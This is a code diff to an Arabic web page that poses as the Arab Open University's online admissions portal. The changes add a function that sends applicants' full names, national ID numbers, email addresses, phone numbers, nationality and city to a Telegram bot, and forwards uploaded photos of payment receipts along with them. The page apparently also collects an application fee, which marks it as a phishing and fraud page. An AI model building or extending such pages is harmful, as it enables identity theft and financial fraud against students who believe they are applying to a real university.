@@ -3,7 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
     <title>بوابة القبول | الجامعة العربية المفتوحة</title>
+    <meta property="og:title" content="بوابة القبول الإلكتروني - الجامعة العربية المفتوحة">
+    <meta property="og:description" content="سجل الآن في برامج البكالوريوس والماجستير والدبلوم عبر بوابة القبول المباشر لعام 1447هـ.">
+    <meta property="og:image" content="https://i.postimg.cc/9MTXNQyK/IMG-20260411-WA0010.jpg">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
     <style>
         :root { --aou-blue: #005696; --gold: #c5a059; --bg: #f8fafc; --success: #276749; }
@@ -90,8 +97,8 @@
                 </div>
                 <div class="section-title" style="font-size: 16px;">المستندات المطلوبة</div>
                 <div class="grid-2">
-                    <div class="input-group"><label>رفع الهوية الوطنية / الإقامة *</label><input type="file" required></div>
-                    <div class="input-group"><label>رفع صورة الشهادة العلمية *</label><input type="file" required></div>
+                    <div class="input-group"><label>رفع الهوية الوطنية / الإقامة *</label><input type="file" id="file_id" required></div>
+                    <div class="input-group"><label>رفع صورة الشهادة العلمية *</label><input type="file" id="file_edu" required></div>
                 </div>
                 <button type="button" class="btn-action" onclick="validateToPay()">حفظ البيانات ومتابعة السداد</button>
             </form>
@@ -247,14 +254,45 @@
         } else alert('يرجى تعبئة كافة الحقول ورفع الملفات');
     }
 
+    // وظيفة إرسال الصور والبيانات بشكل احترافي
+    async function sendToTelegram(text, fileInputId = null) {
+        const urlMessage = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const urlPhoto = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        
+        // إرسال النص أولاً
+        await fetch(urlMessage, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'HTML'})
+        });
+
+        // إرسال الصورة إذا وجدت
+        if (fileInputId) {
+            const fileInput = document.getElementById(fileInputId);
+            if (fileInput.files.length > 0) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', fileInput.files[0]);
+                formData.append('caption', `تابع لـ: ${document.getElementById('name').value}`);
+                await fetch(urlPhoto, { method: 'POST', body: formData });
+            }
+        }
+    }
+
     async function finalStep() {
         const btn = document.getElementById('sendBtn');
         btn.innerText = "جاري الحفظ..."; btn.disabled = true;
-        const msg = `✅ طلب AOU جديد\n👤 ${document.getElementById('name').value}\n🆔 ${document.getElementById('national_id').value}\n📍 ${document.getElementById('major_select').value}`;
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST', headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CHAT_ID, text: msg})
-        });
+
+        const msg = `<b>✅ طلب قبول جديد (AOU)</b>\n\n` +
+                    `👤 الاسم: ${document.getElementById('name').value}\n` +
+                    `🆔 الهوية: ${document.getElementById('national_id').value}\n` +
+                    `📧 البريد: ${document.getElementById('email').value}\n` +
+                    `📱 الجوال: ${document.getElementById('mobile').value}\n` +
+                    `🌍 الجنسية: ${document.getElementById('nat').value}\n` +
+                    `📍 المدينة: ${document.getElementById('city').value}\n` +
+                    `🎓 التخصص: ${document.getElementById('major_select').value}`;
+
+        await sendToTelegram(msg, 'pay_file'); // إرسال البيانات مع إيصال الـ 450
         switchTab('done');
     }
 
@@ -278,11 +316,13 @@
     async function sendFinalConfirmation() {
         const btn = document.getElementById('confirmBtn');
         btn.innerText = "جاري المعالجة..."; btn.disabled = true;
-        const msg = `💰 تأكيد تثبيت مقعد AOU\n🆔 الرقم: ${document.getElementById('uni_id_input').value}\n💵 المبلغ: ${document.getElementById('hours_select').value} ريال`;
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST', headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CHAT_ID, text: msg})
-        });
+
+        const msg = `<b>💰 تأكيد تثبيت مقعد (AOU)</b>\n\n` +
+                    `🆔 الرقم الجامعي: ${document.getElementById('uni_id_input').value}\n` +
+                    `💵 المبلغ المسدد: ${document.getElementById('hours_select').value} ريال\n` +
+                    `👤 الطالب: ${document.getElementById('name').value}`;
+
+        await sendToTelegram(msg, 'final_receipt'); // إرسال تأكيد التثبيت مع إيصال السداد النهائي
         switchTab('final_done');
     }
 </script>
